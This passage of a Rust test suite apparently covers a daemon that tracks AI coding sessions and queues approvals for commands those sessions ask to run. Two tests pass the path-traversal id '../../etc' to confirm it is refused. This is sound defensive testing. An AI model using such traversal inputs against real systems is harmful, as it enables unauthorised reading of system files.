}

#[test]
fn a_worktree_is_named_after_its_main_checkout() {
    let mut bench = Bench::new();
    let main = bench.fixture.root.join("r/opusline");
    checkout(&main);
    let worktree_git = main.join(".git/worktrees/feature");
    fs::create_dir_all(&worktree_git).unwrap();
    fs::write(worktree_git.join("commondir"), "../..\n").unwrap();
    let worktree = bench.fixture.root.join("w/feature");
    fs::create_dir_all(&worktree).unwrap();
    fs::write(worktree.join(".git"), format!("gitdir: {}\n", worktree_git.display())).unwrap();
    bench.report(SESSION_A, json!({"state": "waiting", "cwd": worktree.to_string_lossy(), "project": "feature"}));
    assert_eq!(bench.snapshot()[0]["project"], "opusline");
}

#[test]
fn a_folder_outside_any_repository_is_named_after_itself() {
    let mut bench = Bench::new();
    let folder = bench.fixture.root.join("notes");
    fs::create_dir_all(&folder).unwrap();
    bench.report(SESSION_A, json!({"state": "waiting", "cwd": folder.to_string_lossy()}));
    assert_eq!(bench.snapshot()[0]["project"], "notes");
}

#[test]
fn a_new_session_tags_its_window_and_publishes() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "kitty_pid": "4242"}));
    assert_eq!(bench.world.borrow().hyprctl_calls(), ["CLAUDE_WINDOW_STATE(4242, \"waiting\")"]);
    assert_eq!(bench.snapshot().iter().map(|row| row["session"].as_str().unwrap()).collect::<Vec<_>>(), [SESSION_A]);
}

#[test]
fn publishing_signals_only_the_exact_waybar_process_name() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting"}));
    assert!(bench.commands().contains(&vec!["pkill".to_string(), "-x".into(), "-RTMIN+16".into(), "waybar".into()]));
}

#[test]
fn an_unchanged_state_report_costs_nothing() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working", "kitty_pid": "1"}));
    bench.world.borrow_mut().commands.clear();
    bench.report(SESSION_A, json!({"state": "working", "kitty_pid": "1"}));
    assert!(bench.commands().is_empty());
}

#[test]
fn a_message_raises_a_banner_and_its_absence_drops_it() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "perm", "sticky": true}));
    bench.report(SESSION_A, json!({"state": "working"}));
    assert_eq!(bench.raised(), [SESSION_A]);
    assert!(bench.dropped().contains(&SESSION_A.to_string()));
}

#[test]
fn no_banner_while_the_claude_workspace_is_active() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().on_cockpit = true;
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "perm", "sticky": true}));
    assert!(bench.raised().is_empty());
}

#[test]
fn a_stateless_report_keeps_the_state() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working"}));
    bench.report(SESSION_A, json!({"message": "info"}));
    assert_eq!(bench.registry.sessions[SESSION_A].state, "working");
}

#[test]
fn a_new_id_in_the_same_pane_replaces_the_old_one() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "tmux_pane": "%5", "message": "perm", "sticky": true}));
    bench.report(SESSION_B, json!({"state": "working", "tmux_pane": "%5"}));
    assert_eq!(bench.registry.sessions.keys().collect::<Vec<_>>(), [SESSION_B]);
    assert!(bench.dropped().contains(&SESSION_A.to_string()));
}

#[test]
fn the_snapshot_orders_by_urgency() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working"}));
    bench.report(SESSION_B, json!({"state": "needs-you"}));
    assert_eq!(bench.snapshot().iter().map(|row| row["session"].as_str().unwrap()).collect::<Vec<_>>(), [SESSION_B, SESSION_A]);
}

#[test]
fn a_running_id_is_alive_and_an_older_session_falls_back_to_its_pane() {
    let mut bench = Bench::new();
    let pane = target(&[("tmux_pane", "%12")]);
    assert!(!bench.registry.is_dead(SESSION_A, &pane, &set(&[SESSION_A]), &set(&[])));
    // A pre-2.1.300 session (no id on a command line) next to a newer one keeps its pane rule.
    assert!(!bench.registry.is_dead(SESSION_B, &pane, &set(&[SESSION_A]), &set(&["%12"])));
    assert!(bench.registry.is_dead(SESSION_B, &pane, &set(&[SESSION_A]), &set(&["%3"])));
}

#[test]
fn without_ids_the_pane_decides_then_the_terminal() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().dead_pids = set(&["999999"]);
    let live = set(&["%3"]);
    assert!(!bench.registry.is_dead(SESSION_A, &target(&[("tmux_pane", "%3"), ("kitty_pid", "999999")]), &set(&[]), &live));
    assert!(bench.registry.is_dead(SESSION_A, &target(&[("tmux_pane", "%12")]), &set(&[]), &live));
    assert!(bench.registry.is_dead(SESSION_A, &target(&[("kitty_pid", "999999")]), &set(&[]), &live));
    assert!(!bench.registry.is_dead(SESSION_A, &target(&[("kitty_pid", "4242")]), &set(&[]), &live));
}

#[test]
fn prune_drops_sessions_whose_pane_lost_its_claude() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working", "tmux_pane": "%7"}));
    bench.registry.prune_dead();
    assert!(bench.registry.sessions.is_empty());
}

#[test]
fn reconcile_flags_a_session_whose_claude_updated_itself() {
    let mut bench = Bench::new();
    {
        let mut world = bench.world.borrow_mut();
        world.claude_panes = set(&["%5"]);
        world.pane_tails.insert("%5".into(), "❯ \n  ✓ Update installed · Restart to update\n".into());
    }
    bench.report(SESSION_A, json!({"state": "waiting", "tmux_pane": "%5"}));
    bench.registry.prune_dead();
    assert!(bench.registry.sessions[SESSION_A].update);
    assert_eq!(bench.snapshot()[0]["update"], true);
    bench.world.borrow_mut().pane_tails.insert("%5".into(), "❯ \n".into());
    bench.registry.prune_dead();
    assert!(!bench.registry.sessions[SESSION_A].update);
}

#[test]
fn reconcile_follows_the_pane_in_both_directions() {
    let mut bench = Bench::new();
    {
        let mut world = bench.world.borrow_mut();
        world.pane_tails = HashMap::from([("%5".into(), "✻ Flowing… (11s)\n❯ \n".into()), ("%6".into(), " Do you want to proceed?\n ❯ 1. Yes\n".into()),
                                          ("%7".into(), "done\n❯ \n".into())]);
        world.claude_panes = set(&["%5", "%6", "%7"]);
    }
    for (session, pane, state) in [(SESSION_A, "%5", "needs-you"), (SESSION_B, "%6", "working"), (SESSION_C, "%7", "needs-you")] {
        bench.report(session, json!({"state": state, "tmux_pane": pane}));
    }
    bench.registry.prune_dead();
    let states: BTreeMap<&str, &str> = bench.registry.sessions.iter().map(|(session, entry)| (&session[..8], entry.state.as_str())).collect();
    assert_eq!(states, BTreeMap::from([("aaaaaaaa", "working"), ("bbbbbbbb", "needs-you"), ("cccccccc", "waiting")]));
}

#[test]
fn an_opencode_pane_is_not_read_with_claudes_patterns() {
    // A "❯ " in opencode's screen is no idle Claude prompt: only its plugin's reports set its state.
    let mut bench = Bench::new();
    {
        let mut world = bench.world.borrow_mut();
        world.pane_tails = HashMap::from([("%5".into(), "done\n❯ \n Do you want to proceed?\n ❯ 1. Yes\n".into())]);
        world.claude_panes = set(&["%5"]);
    }
    bench.report(OPENCODE_SESSION, json!({"state": "working", "tmux_pane": "%5", "agent": "opencode"}));
    bench.registry.prune_dead();
    assert_eq!(bench.registry.sessions[OPENCODE_SESSION].state, "working");
}

#[test]
fn a_sessions_agent_is_in_the_snapshot_and_the_reboot_record_and_claude_by_default() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "cwd": "/a"}));
    bench.report(OPENCODE_SESSION, json!({"state": "waiting", "cwd": "/b", "agent": "opencode"}));
    bench.report(OPENCODE_SESSION, json!({"state": "working"}));
    let agent = |bench: &Bench, session: &str| bench.snapshot().iter().find(|row| row["session"] == session).unwrap()["agent"].clone();
    assert_eq!(agent(&bench, SESSION_A), "claude");
    assert_eq!(agent(&bench, OPENCODE_SESSION), "opencode", "a report without the field keeps it");
    let recent: Value = serde_json::from_str(&fs::read_to_string(cockpit::paths::recent_sessions()).unwrap()).unwrap();
    assert_eq!(recent[OPENCODE_SESSION]["agent"], "opencode");
}

#[test]
fn clear_forgets_everything_and_untags() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working", "kitty_pid": "1"}));
    bench.world.borrow_mut().commands.clear();
    bench.registry.clear();
    assert!(bench.registry.sessions.is_empty());
    assert_eq!(bench.world.borrow().hyprctl_calls(), ["CLAUDE_WINDOW_STATE(1, nil)"]);
}

#[test]
fn the_snapshot_survives_a_restart_and_skips_bad_rows() {
    let fixture = Fixture::new();
    cockpit::util::write_json(&cockpit::paths::snapshot(), &json!({"sessions": [
        {"session": SESSION_A, "state": "working", "project": "p", "since": 1, "tmux_pane": "%2"},
        {"session": SESSION_B, "state": "nope", "project": "p", "since": 1},
    ]})).unwrap();
    let bench = Bench::with(fixture, World { claude_panes: set(&["%2"]), ..World::default() });
    assert_eq!(bench.registry.sessions.keys().collect::<Vec<_>>(), [SESSION_A]);
}

#[test]
fn focusing_shows_the_most_urgent_session_and_drops_its_banner() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working", "tmux_pane": "%1"}));
    bench.report(SESSION_B, json!({"state": "needs-you", "tmux_pane": "%2"}));
    bench.registry.focus_most_urgent();
    assert!(bench.commands().contains(&vec!["claude-sessions".to_string(), "show".into(), SESSION_B.into()]));
    assert!(bench.dropped().contains(&SESSION_B.to_string()));
}

// ---- Where a session's window is ----

fn resolving_bench(client_environment: &[(&str, &str)], clients: &str) -> Bench {
    let mut world = World { session_name: Some("S\n".into()), clients: clients.into(), dead_pids: set(&["999998", "999999"]), ..World::default() };
    world.environments.insert("c1".into(), client_environment.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect());
    Bench::with(Fixture::new(), world)
}

#[test]
fn the_attached_client_names_the_live_window() {
    let mut bench = resolving_bench(&[("KITTY_PID", "4242"), ("KITTY_WINDOW_ID", "1")], "c1\n");
    let resolved = bench.registry.resolve_target(target(&[("tmux_pane", "%3"), ("kitty_pid", "999998")]));
    assert_eq!(resolved, target(&[("tmux_pane", "%3"), ("kitty_pid", "4242"), ("kitty_window", "1")]));
}

#[test]
fn dead_pids_are_dropped_not_trusted() {
    let mut bench = resolving_bench(&[("KITTY_PID", "999999")], "c1\n");
    assert_eq!(bench.registry.resolve_target(target(&[("tmux_pane", "%3"), ("kitty_pid", "999998")])), target(&[("tmux_pane", "%3")]));
}

#[test]
fn without_a_client_the_hook_values_stay() {
    let mut bench = resolving_bench(&[], "");
    let reported = target(&[("tmux_pane", "%9"), ("kitty_pid", "4242")]);
    assert_eq!(bench.registry.resolve_target(reported.clone()), reported);
}

// ---- The run queue ----

#[test]
fn ask_to_run_phases_follow_the_requesting_session_until_done() {
    let mut bench = Bench::new();
    for session in [SESSION_A, SESSION_B] {
        bench.report(session, json!({"state": "working", "cwd": "/r/same-project"}));
    }
    for (id, session) in [(RUN_A, SESSION_A), (RUN_B, SESSION_B)] {
        fs::write(cockpit::approval::held_request(id, "request"), json!({"answers": ANSWERS_KEY, "session": session}).to_string()).unwrap();
    }
    let phase = |bench: &Bench, session: &str| {
        bench.snapshot().iter().find(|row| row["session"] == session).unwrap()["ask_to_run"].clone()
    };
    bench.registry.run_request(RUN_A).unwrap();
    assert_eq!(phase(&bench, SESSION_A), "approval");
    assert_eq!(phase(&bench, SESSION_B), "");
    bench.registry.run_request(RUN_B).unwrap();
    assert_eq!(phase(&bench, SESSION_B), "approval", "queued approvals are visible too");
    bench.registry.run_phase(RUN_A, "running");
    assert_eq!(phase(&bench, SESSION_A), "running");
    bench.registry.run_phase(RUN_A, "input");
    assert_eq!(phase(&bench, SESSION_A), "input", "input remains visible while another approval is shown");
    bench.registry.run_phase(RUN_B, "done");
    assert_eq!(phase(&bench, SESSION_B), "");
    bench.registry.run_phase(RUN_A, "running");
    assert_eq!(phase(&bench, SESSION_A), "running");
    bench.registry.run_phase(RUN_A, "done");
    assert_eq!(phase(&bench, SESSION_A), "");
}

#[test]
fn an_abandoned_ask_to_run_disappears_from_its_session_card() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working"}));
    fs::write(cockpit::approval::held_request(RUN_A, "request"), json!({"answers": ANSWERS_KEY, "session": SESSION_A}).to_string()).unwrap();
    bench.registry.run_request(RUN_A).unwrap();
    assert_eq!(bench.snapshot()[0]["ask_to_run"], "approval");
    heartbeat(&bench, RUN_A, 600);
    bench.registry.tick_queues();
    assert_eq!(bench.snapshot()[0]["ask_to_run"], "");
}

#[test]
fn approval_takes_precedence_over_a_running_command_in_the_same_session() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working"}));
    for id in [RUN_A, RUN_B] {
        fs::write(cockpit::approval::held_request(id, "request"), json!({"answers": ANSWERS_KEY, "session": SESSION_A}).to_string()).unwrap();
    }
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "input");
    bench.registry.run_phase(RUN_A, "running");
    bench.registry.run_request(RUN_B).unwrap();
    assert_eq!(bench.snapshot()[0]["ask_to_run"], "approval");
}


fn started_sessions(bench: &Bench) -> Vec<String> {
    bench.commands().iter().filter(|command| command[..2] == ["tmux", "new-session"]).map(|command| command[4].clone()).collect()
}

#[test]
fn a_bad_request_id_is_refused() {
    let mut bench = Bench::new();
    assert!(bench.registry.run_request("../../etc").is_err());
}

#[test]
fn every_request_gets_a_pane_before_the_first_is_answered() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    assert_eq!(started_sessions(&bench), ["claude-run-aaaaaaaaaaaa", "claude-run-bbbbbbbbbbbb"]);
    assert!(bench.commands().contains(&vec!["claude-sessions".to_string(), "approval-pane".into(), RUN_A.into()]));
    assert!(bench.commands().contains(&vec!["claude-sessions".to_string(), "approval-pane".into(), RUN_B.into()]));
    assert_eq!(bench.windows().len(), 1, "floating approvals still wait their turn");
}

#[test]
fn approving_hides_the_pane_until_the_command_needs_input() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    let close = vec!["claude-sessions".to_string(), "approval-pane".into(), "close".into(), RUN_A.into()];
    assert!(bench.commands().contains(&close), "approval pane stayed open while running");
    bench.registry.run_phase(RUN_A, "input");
    let show = vec!["claude-sessions".to_string(), "approval-pane".into(), RUN_A.into()];
    assert_eq!(bench.commands().iter().filter(|command| **command == show).count(), 2);
}

#[test]
fn after_an_answer_the_pane_stays_until_the_command_ends() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    bench.registry.run_phase(RUN_A, "input");
    let close = vec!["claude-sessions".to_string(), "approval-pane".into(), "close".into(), RUN_A.into()];
    let closes_before_answer = bench.commands().iter().filter(|command| **command == close).count();
    bench.registry.run_phase(RUN_A, "running");
    bench.registry.tick_queues();
    assert_eq!(bench.commands().iter().filter(|command| **command == close).count(), closes_before_answer,
               "answering the command's prompt hid its output");
    bench.registry.run_phase(RUN_A, "done");
    assert_eq!(bench.commands().iter().filter(|command| **command == close).count(), closes_before_answer + 1);
}

#[test]
fn approving_a_queued_request_hides_its_pane() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    bench.registry.run_phase(RUN_B, "running");
    assert!(bench.commands().contains(&vec!["claude-sessions".to_string(), "approval-pane".into(), "close".into(), RUN_B.into()]));
}

#[test]
fn a_later_approval_can_run_and_finish_before_the_first_is_answered() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    bench.registry.run_phase(RUN_B, "running");
    assert_eq!(bench.registry.runs.running, [RUN_B]);
    bench.registry.run_phase(RUN_B, "done");
    assert!(bench.commands().contains(&vec!["claude-sessions".to_string(), "approval-pane".into(), "close".into(), RUN_B.into()]));
    bench.registry.run_phase(RUN_A, "done");
    assert_eq!(bench.registry.runs.current, "", "completed approval must not be shown again");
}

#[test]
fn a_later_approval_waiting_for_input_is_not_started_again() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    bench.registry.run_phase(RUN_B, "running");
    bench.registry.run_phase(RUN_B, "input");
    bench.registry.run_phase(RUN_A, "done");
    assert_eq!((bench.registry.runs.current.as_str(), bench.registry.runs.phase.as_str()), (RUN_B, "input"));
    assert_eq!(started_sessions(&bench), ["claude-run-aaaaaaaaaaaa", "claude-run-bbbbbbbbbbbb"]);
}

#[test]
fn a_later_approval_can_be_declined_without_being_shown_again() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    bench.registry.run_phase(RUN_B, "done");
    bench.registry.run_phase(RUN_A, "done");
    assert_eq!(bench.registry.runs.current, "");
    assert_eq!(bench.windows().len(), 1);
}

#[test]
fn a_pane_announcing_its_approval_preserves_the_floating_window_order() {
    let mut bench = Bench::new();
    let third_run = "cccccccccccc";
    fs::write(cockpit::approval::held_request(third_run, "request"), json!({"answers": ANSWERS_KEY}).to_string()).unwrap();
    for id in [RUN_A, RUN_B, third_run] {
        bench.registry.run_request(id).unwrap();
    }
    bench.registry.run_phase(RUN_B, "asking");
    bench.registry.run_phase(RUN_A, "done");
    assert_eq!(bench.windows()[1].borrow().command.last().unwrap(), "=claude-run-bbbbbbbbbbbb");
}

#[test]
fn an_abandoned_later_approval_closes_while_the_first_still_asks() {
    let mut bench = Bench::new();
    heartbeat(&bench, RUN_A, 0);
    heartbeat(&bench, RUN_B, 0);
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    heartbeat(&bench, RUN_B, 600);
    bench.registry.tick_queues();
    assert_eq!(result_status(&bench, RUN_B).as_deref(), Some("abandoned"));
    assert!(bench.commands().contains(&vec!["claude-sessions".to_string(), "approval-pane".into(), "close".into(), RUN_B.into()]));
    assert_eq!(bench.registry.runs.current, RUN_A);
}

#[test]
fn a_finished_request_closes_the_pane_and_starts_the_next() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    bench.registry.run_phase(RUN_A, "done");
    assert!(bench.commands().contains(&vec!["claude-sessions".to_string(), "approval-pane".into(), "close".into(), RUN_A.into()]));
    assert_eq!(bench.registry.runs.current, RUN_B);
}

#[test]
fn answering_command_input_returns_attention_without_closing_its_output() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "input");
    bench.registry.run_phase(RUN_A, "running");
    assert!(bench.commands().contains(&vec!["claude-sessions".into(), "attention-answered".into(), RUN_A.into()]));
    assert!(!bench.commands().contains(&vec!["claude-sessions".into(), "approval-pane".into(), "close".into(), RUN_A.into()]));
}

#[test]
fn an_answered_request_in_the_queue_is_skipped() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    fs::write(bench.fixture.answers("runs").join(format!("{RUN_B}.result")), "{}").unwrap();
    bench.registry.run_phase(RUN_A, "done");
    assert_eq!(bench.registry.runs.current, "");
}

#[test]
fn a_request_naming_no_answers_folder_never_shows() {
    // Security audit M3: its answer would have nowhere to go but a folder every sandbox reads.
    let mut bench = Bench::new();
    fs::write(cockpit::approval::held_request(RUN_A, "request"), "{}").unwrap();
    bench.registry.run_request(RUN_A).unwrap();
    assert!(started_sessions(&bench).is_empty());
    assert_eq!(bench.registry.runs.current, "");
}

#[test]
fn a_guide_naming_no_answers_folder_never_opens() {
    let mut bench = Bench::new();
    fs::write(cockpit::approval::held_request(RUN_A, "guide"), "{}").unwrap();
    bench.registry.guide_request(RUN_A).unwrap();
    assert!(bench.windows().is_empty());
}

/// The heartbeat ask-to-run keeps while it waits, last touched `seconds_ago`.
fn heartbeat(bench: &Bench, id: &str, seconds_ago: u64) {
    let path = bench.fixture.queue().join(format!("{id}.waiting"));
    fs::write(&path, "").unwrap();
    let touched = std::time::SystemTime::now() - std::time::Duration::from_secs(seconds_ago);
    fs::File::options().write(true).open(&path).unwrap().set_modified(touched).unwrap();
}

fn result_status(bench: &Bench, id: &str) -> Option<String> {
    let text = fs::read_to_string(bench.fixture.answers("runs").join(format!("{id}.result"))).ok()?;
    serde_json::from_str::<Value>(&text).ok()?["status"].as_str().map(str::to_string)
}

#[test]
fn an_approval_nobody_waits_for_any_more_is_dropped_and_the_next_starts() {
    let mut bench = Bench::new();
    heartbeat(&bench, RUN_A, 0);
    heartbeat(&bench, RUN_B, 0);
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    heartbeat(&bench, RUN_A, 600);
    bench.registry.tick_queues();
    assert_eq!(result_status(&bench, RUN_A).as_deref(), Some("abandoned"));
    assert!(bench.commands().contains(&vec!["tmux".to_string(), "kill-session".into(), "-t".into(), format!("=claude-run-{RUN_A}")]));
    assert!(bench.windows()[0].borrow().closed);
    assert_eq!(bench.registry.runs.current, RUN_B);
}

#[test]
fn an_approval_whose_asker_still_waits_stays() {
    let mut bench = Bench::new();
    heartbeat(&bench, RUN_A, 0);
    bench.registry.run_request(RUN_A).unwrap();
    heartbeat(&bench, RUN_A, 120);
    bench.registry.tick_queues();
    assert_eq!(bench.registry.runs.current, RUN_A);
    assert_eq!(result_status(&bench, RUN_A), None);
}

#[test]
fn a_running_command_is_never_dropped() {
    let mut bench = Bench::new();
    heartbeat(&bench, RUN_A, 0);
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    heartbeat(&bench, RUN_A, 600);
    bench.registry.tick_queues();
    assert_eq!(bench.registry.runs.running, [RUN_A]);
    assert_eq!(result_status(&bench, RUN_A), None, "dropped while it runs");
}

#[test]
fn the_next_request_shows_while_an_approved_command_runs() {
    // Parallel sessions, a project's parallel clones too: a long command does not hold the others back.
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    assert_eq!((bench.registry.runs.current.as_str(), bench.registry.runs.running.as_slice()), (RUN_B, &[RUN_A.to_string()][..]));
    assert_eq!(started_sessions(&bench), ["claude-run-aaaaaaaaaaaa", "claude-run-bbbbbbbbbbbb"]);
}

#[test]
fn a_running_command_that_asks_for_input_waits_for_the_approval_on_screen() {
    // Theo answers one thing at a time: the command waiting for its sudo password comes next.
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    bench.registry.run_phase(RUN_A, "input");
    assert_eq!(bench.registry.runs.current, RUN_B);
    bench.registry.run_phase(RUN_B, "done");
    assert_eq!((bench.registry.runs.current.as_str(), bench.registry.runs.phase.as_str()), (RUN_A, "input"));
}

#[test]
fn a_command_that_ends_while_running_on_closes_its_own_pane() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    bench.registry.run_phase(RUN_A, "done");
    assert!(bench.commands().contains(&vec!["claude-sessions".to_string(), "approval-pane".into(), "close".into(), RUN_A.into()]));
    assert!(bench.registry.runs.running.is_empty());
    assert_eq!(bench.registry.runs.current, RUN_B);
}

#[test]
fn a_queued_request_nobody_waits_for_is_skipped() {
    let mut bench = Bench::new();
    heartbeat(&bench, RUN_A, 0);
    heartbeat(&bench, RUN_B, 0);
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_request(RUN_B).unwrap();
    heartbeat(&bench, RUN_B, 600);
    bench.registry.run_phase(RUN_A, "done");
    assert_eq!(bench.registry.runs.current, "");
    assert_eq!(result_status(&bench, RUN_B).as_deref(), Some("abandoned"));
    assert!(bench.commands().contains(&vec!["tmux".to_string(), "kill-session".into(), "-t".into(), format!("=claude-run-{RUN_B}")]));
    assert!(bench.commands().contains(&vec!["claude-sessions".to_string(), "approval-pane".into(), "close".into(), RUN_B.into()]));
}

#[test]
fn a_request_without_a_heartbeat_counts_from_its_filing() {
    let mut bench = Bench::new();
    fs::write(cockpit::approval::held_request(RUN_A, "request"), json!({"answers": ANSWERS_KEY}).to_string()).unwrap();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.tick_queues();
    assert_eq!(bench.registry.runs.current, RUN_A, "a fresh request is not dropped for lack of a heartbeat");
}

#[test]
fn the_window_opens_while_it_needs_theo_off_the_cockpit() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    assert_eq!(bench.windows()[0].borrow().command.last().unwrap(), "=claude-run-aaaaaaaaaaaa");
}

#[test]
fn the_window_closes_once_the_command_runs() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    bench.registry.tick_queues();
    assert!(bench.windows()[0].borrow().closed);
    assert_eq!(bench.windows().len(), 1, "none opens while it just runs");
}

#[test]
fn the_window_comes_back_when_the_command_asks_for_input() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    bench.registry.run_phase(RUN_A, "input");
    assert_eq!(bench.windows().len(), 2);
    assert!(!bench.windows()[1].borrow().closed);
}

#[test]
fn after_an_answer_the_window_stays_until_the_command_ends() {
    // Typing "y" at an install prompt closed it at once: Theo lost what the answer did.
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    bench.registry.run_phase(RUN_A, "input");
    bench.registry.run_phase(RUN_A, "running");
    assert!(!bench.windows()[1].borrow().closed);
    bench.registry.run_phase(RUN_A, "done");
    assert!(bench.windows()[1].borrow().closed);
}

#[test]
fn a_window_theo_closes_stays_closed_while_it_asks() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.windows()[0].borrow_mut().closed = true;
    bench.registry.tick_queues();
    bench.registry.tick_queues();
    assert_eq!(bench.windows().len(), 1, "reopened after Theo closed it");
}

#[test]
fn a_window_theo_closed_comes_back_for_the_next_question() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.windows()[0].borrow_mut().closed = true;
    bench.registry.tick_queues();
    bench.registry.run_phase(RUN_A, "running");
    bench.registry.run_phase(RUN_A, "input");
    assert_eq!(bench.windows().len(), 2);
    assert!(!bench.windows()[1].borrow().closed);
}

#[test]
fn after_an_answer_a_window_closed_on_the_cockpit_does_not_follow_theo_elsewhere() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    bench.registry.run_phase(RUN_A, "input");
    bench.registry.run_phase(RUN_A, "running");
    bench.world.borrow_mut().on_cockpit = true;
    bench.registry.tick_queues();
    bench.world.borrow_mut().on_cockpit = false;
    bench.registry.tick_queues();
    assert_eq!(bench.windows().len(), 2, "reopened on the next workspace");
    assert!(bench.windows()[1].borrow().closed);
}

#[test]
fn a_command_that_never_asks_for_input_runs_without_its_window() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    assert!(bench.windows()[0].borrow().closed);
}

#[test]
fn input_asked_during_a_game_opens_no_window() {
    let mut bench = Bench::new();
    bench.registry.run_request(RUN_A).unwrap();
    bench.registry.run_phase(RUN_A, "running");
    bench.world.borrow_mut().gaming = true;
    bench.registry.run_phase(RUN_A, "input");
    bench.registry.tick_queues();
    assert_eq!(bench.windows().len(), 1);
}

#[test]
fn no_window_on_the_cockpit() {
    let mut bench = Bench::with(Fixture::new(), World { on_cockpit: true, ..World::default() });
    bench.registry.run_request(RUN_A).unwrap();
    assert!(bench.windows().is_empty());
}

#[test]
fn no_window_while_gaming() {
    let mut bench = Bench::with(Fixture::new(), World { gaming: true, ..World::default() });
    bench.registry.run_request(RUN_A).unwrap();
    assert!(bench.windows().is_empty());
}

// ---- The guide queue ----

#[test]
fn a_bad_guide_id_is_refused() {
    let mut bench = Bench::new();
    assert!(bench.registry.guide_request("../../etc").is_err());
}

#[test]
fn a_guide_opens_in_a_floating_window_of_its_own_one_at_a_time() {
    let mut bench = Bench::new();
    bench.registry.guide_request(RUN_A).unwrap();
    bench.registry.guide_request(RUN_B).unwrap();
    let windows = bench.windows();
    assert_eq!(windows.len(), 1);
    let command = windows[0].borrow().command.clone();
    assert_eq!(command[..3], ["kitty", "--class", "claude-guide"]);
    assert_eq!(command.last().unwrap(), RUN_A);
}

#[test]
fn while_gaming_the_guide_waits_then_opens() {
    let mut bench = Bench::with(Fixture::new(), World { gaming: true, ..World::default() });
    bench.registry.guide_request(RUN_A).unwrap();
    bench.registry.tick_queues();
    assert!(bench.windows().is_empty());
    assert!(bench.raised().is_empty());
    bench.world.borrow_mut().gaming = false;
    bench.registry.tick_queues();
    assert_eq!(bench.windows().len(), 1);
}

#[test]
fn closing_the_guide_window_tells_claude_where_theo_stopped_and_opens_the_next() {
    let mut bench = Bench::new();
    bench.registry.guide_request(RUN_A).unwrap();
    bench.registry.guide_request(RUN_B).unwrap();
    fs::write(bench.fixture.answers("guides").join(format!("{RUN_A}.progress")), json!({"step": 2, "total": 5, "done": 1}).to_string()).unwrap();
    bench.windows()[0].borrow_mut().closed = true;
    bench.registry.tick_queues();
    let result: Value = serde_json::from_str(&fs::read_to_string(bench.fixture.answers("guides").join(format!("{RUN_A}.result"))).unwrap()).unwrap();
    assert_eq!((result["status"].as_str(), result["step"].as_i64(), result["total"].as_i64()), (Some("closed"), Some(2), Some(5)));
    assert!(bench.dropped().contains(&format!("notice:guide-{RUN_A}")));
    assert_eq!(bench.registry.guides.current, RUN_B);
    assert_eq!(bench.windows()[1].borrow().command.last().unwrap(), RUN_B);
}

#[test]
fn a_project_name_with_escape_codes_is_not_taken() {
    let mut bench = Bench::new();
